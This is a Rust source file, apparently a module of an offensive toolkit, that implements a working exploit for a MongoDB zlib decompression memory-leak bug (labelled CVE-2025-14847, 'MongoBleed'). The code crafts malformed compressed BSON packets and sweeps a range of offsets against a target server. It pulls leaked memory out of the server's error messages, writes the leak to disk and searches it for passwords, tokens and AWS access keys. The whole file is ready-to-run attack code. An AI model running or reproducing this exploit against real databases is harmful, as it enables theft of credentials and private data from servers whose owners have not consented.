use anyhow::{Context, Result};
use colored::*;
use std::io::{Read, Write};
use flate2::write::ZlibEncoder;
use flate2::Compression;
use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::time::{timeout, Duration};
use regex::bytes::Regex;
use std::fs::File;

/// MongoBleed Exploit (CVE-2025-14847)
/// 
/// Exploits zlib decompression bug to leak server memory via BSON field names.
/// Based on POC by Joe Desimone (https://github.com/joe-desimone/mongobleed)
/// and Neo23x0 (https://github.com/Neo23x0/mongobleed-detector)
pub async fn run(target: &str) -> Result<()> {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║              MongoBleed (CVE-2025-14847)                  ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
    println!("{}", format!("[*] Target: {}", target).yellow());

    // Normalize target using shared utility
    let normalized = crate::utils::normalize_target(target)?;
    let target_addr = if normalized.contains(':') {
        normalized
    } else {
        format!("{}:27017", normalized)
    };

    let min_offset = 20;
    let max_offset = 8192;
    println!("{}", format!("[*] Scanning offsets {}-{}...", min_offset, max_offset).cyan());

    let mut all_leaked = Vec::new();
    let mut unique_leaks = std::collections::HashSet::new();

    // Loop through offsets to try and trigger a leak
    for doc_len in min_offset..max_offset {
        // Python: response = send_probe(args.host, args.port, doc_len, doc_len + 500)
        match send_probe(&target_addr, doc_len, doc_len + 500).await {
            Ok(leaks) => {
                 for data in leaks {
                     if !unique_leaks.contains(&data) {
                         unique_leaks.insert(data.clone());
                         all_leaked.extend_from_slice(&data);

                         // Show interesting leaks (> 10 bytes) - matches Python logic
                         if data.len() > 10 {
                             let preview = String::from_utf8_lossy(&data).replace('\n', "\\n");
                             let preview_trunk: String = preview.chars().take(80).collect();
                             println!("[+] offset={:4} len={:4}: {}", doc_len, data.len(), preview_trunk.magenta());
                         }
                     }
                 }
            }
            Err(_) => {
                // Connection errors are common during exploitation attempts, ignore and continue
            }
        }
    }

    // Save results
    // Python saves to 'leaked.bin'
    let output_file = "leaked_mongo_data.bin";
    let mut f = File::create(output_file).context("Failed to create output file")?;
    f.write_all(&all_leaked)?;

    println!();
    println!("{}", format!("[*] Total leaked: {} bytes", all_leaked.len()).yellow());
    println!("{}", format!("[*] Unique fragments: {}", unique_leaks.len()).yellow());
    println!("{}", format!("[*] Saved to: {}", output_file).green());

    // Show any secrets found
    // Python patterns: ['password', 'secret', 'key', 'token', 'admin', 'AKIA']
    let secrets = vec![
        "password", "secret", "key", "token", "admin", "AKIA"
    ];

    // Convert all leaked to string (lossy) for searching
    let all_leaked_str = String::from_utf8_lossy(&all_leaked).to_lowercase();
    
    for s in secrets {
        if all_leaked_str.contains(s) {
            println!("{}", format!("[!] Found pattern: {}", s).red().bold());
        }
    }

    Ok(())
}

async fn send_probe(addr: &str, doc_len: u32, buffer_size: u32) -> Result<Vec<Vec<u8>>> {
    // 1. Construct the malicious BSON payload
    // Python: bson = struct.pack('<i', doc_len) + content
    // content = b'\x10a\x00\x01\x00\x00\x00'  # int32 a=1
    let content = b"\x10a\x00\x01\x00\x00\x00";
    let mut bson = Vec::new();
    bson.extend_from_slice(&doc_len.to_le_bytes()); // inflated doc_len
    bson.extend_from_slice(content);

    // 2. Wrap in OP_MSG (Code 2013)
    // Python: op_msg = struct.pack('<I', 0) + b'\x00' + bson
    let mut op_msg = Vec::new();
    op_msg.extend_from_slice(&0u32.to_le_bytes()); // flagBits
    op_msg.push(0x00); // sectionKind
    op_msg.extend_from_slice(&bson);

    // 3. Compress using zlib
    let mut encoder = ZlibEncoder::new(Vec::new(), Compression::default());
    encoder.write_all(&op_msg)?;
    let compressed = encoder.finish()?;

    // 4. Create OP_COMPRESSED (Code 2012) payload
    // use code 2013 internally
    let mut payload = Vec::new();
    payload.extend_from_slice(&2013u32.to_le_bytes()); // originalOpcode
    payload.extend_from_slice(&buffer_size.to_le_bytes()); // uncompressedSize
    payload.push(2); // zlib ID
    payload.extend_from_slice(&compressed);

    // 5. Create Header
    // header = struct.pack('<IIII', 16 + len(payload), 1, 0, 2012)
    let msg_length = 16 + payload.len() as u32;
    let mut header = Vec::new();
    header.extend_from_slice(&msg_length.to_le_bytes());
    header.extend_from_slice(&1u32.to_le_bytes()); // requestID
    header.extend_from_slice(&0u32.to_le_bytes()); // responseTo
    header.extend_from_slice(&2012u32.to_le_bytes()); // opCode (OP_COMPRESSED)

    // Send data
    let mut stream = timeout(Duration::from_secs(2), TcpStream::connect(addr))
        .await
        .context("Connection timed out")??;
    
    stream.write_all(&header).await?;
    stream.write_all(&payload).await?;

    // Read response
    let mut response = Vec::new();
    let mut buf = [0u8; 4096];
    
    // Read loop with timeout
    let read_result = timeout(Duration::from_secs(2), async {
        // First read length (4 bytes)
        let n = stream.read(&mut buf).await?;
        if n == 0 { return Ok(()); }
        response.extend_from_slice(&buf[..n]);
        
        // If we got enough for header, check length and read remainder
        while response.len() < 4 || (response.len() >= 4 && response.len() < u32::from_le_bytes(response[0..4].try_into().unwrap_or([0,0,0,0])) as usize) {
             let n = stream.read(&mut buf).await?;
             if n == 0 { break; }
             response.extend_from_slice(&buf[..n]);
        }
        Ok::<(), anyhow::Error>(())
    }).await;

    // Ignore read errors (timeout etc), proceed to check what we got
    let _ = read_result;

    extract_leaks(&response)
}

fn extract_leaks(response: &[u8]) -> Result<Vec<Vec<u8>>> {
    if response.len() < 25 {
        return Ok(vec![]);
    }

    let opcode = u32::from_le_bytes(response[12..16].try_into().unwrap_or([0,0,0,0]));
    
    // Python logic: check if opcode 2012 (compressed)
    // Decompress if so.
    let raw_data = if opcode == 2012 {
        if response.len() > 25 {
            let mut d = flate2::read::ZlibDecoder::new(&response[25..]);
            let mut buffer = Vec::new();
            if d.read_to_end(&mut buffer).is_ok() {
               buffer
            } else {
                return Ok(vec![]);
            }
        } else {
            return Ok(vec![]);
        }
    } else {
        if response.len() > 16 {
            response[16..].to_vec()
        } else {
             return Ok(vec![]);
        }
    };

    let mut leaks = Vec::new();

    // Search for "field name '...'" error pattern
    let re_field = Regex::new(r"field name '([^']*)'")?;
    for cap in re_field.captures_iter(&raw_data) {
        if let Some(m) = cap.get(1) {
            let data = m.as_bytes().to_vec();
            // Filter some common boring strings
            if data != b"?" && data != b"a" && data != b"$db" && data != b"ping" {
                leaks.push(data);
            }
        }
    }

    // Search for "type (\d+)" pattern
    let re_type = Regex::new(r"type (\d+)")?;
    for cap in re_type.captures_iter(&raw_data) {
        if let Some(m) = cap.get(1) {
             if let Ok(s) = std::str::from_utf8(m.as_bytes()) {
                 if let Ok(val) = s.parse::<u8>() {
                     leaks.push(vec![val]);
                 }
             }
        }
    }
    
    Ok(leaks)
}
